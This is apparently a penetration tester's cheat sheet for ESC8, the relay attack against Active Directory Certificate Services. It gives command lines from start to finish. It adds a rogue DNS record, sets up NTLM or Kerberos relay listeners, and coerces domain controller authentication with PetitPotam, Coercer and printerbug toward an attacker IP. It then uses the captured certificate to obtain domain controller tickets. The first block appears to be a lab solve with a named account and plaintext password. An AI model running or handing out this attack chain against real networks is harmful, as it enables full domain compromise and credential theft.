# ESC8
```powershell
// Added rogue DNS Record
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <KALI IP>

// Set Listener
certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController

// Coercion
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam

// Kerberos Auth
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
```

# Reconnaissance
```powershell
certipy find -u 'user@domain.local' -p 'Password123' -dc-ip 10.10.10.10 -vulnerable

crackmapexec ldap 10.10.10.10 -u user -p Password123 -M adcs

curl -k http://10.10.10.10/certsrv/
```

# Set Up NTLM Relay
```powershell
impacket-ntlmrelayx -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'
impacket-ntlmrelayx -t http://CA.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template 'Machine'
```

# Trigger NTLM Authentication
```powershell
python3 PetitPotam.py -d domain.local -u user -p Password123 <attacker-ip> <DC-ip>

python3 Coercer.py coerce -u user -p Password123 -d domain.local -l <attacker-ip> -t <DC-ip>

python3 printerbug.py domain.local/user:Password123@<DC-ip> <attacker-ip>
```

# Trigger Kerberos Authentication
```powershell
pip install krbrelayx

python3 krbrelayx.py --target http://CA.domain.local/certsrv/certfnsh.asp --adcs --template DomainController

python3 printerbug.py -no-ntlm domain.local/user:Password123@<DC-ip> <attacker-ip>
```

# Authenticate with the Certificate
```powershell
certipy auth -pfx dc.pfx -dc-ip 10.10.10.10

python3 gettgtpkinit.py -cert-pfx dc.pfx domain.local/DC$ dc.ccache

// WebDAV + Kerberos Coercion
crackmapexec smb 10.10.10.10 -u user -p Password123 -M webdav

python3 Coercer.py coerce -u user -p Password123 -d domain.local -l <attacker-ip> -t <DC-ip> --webdav
```
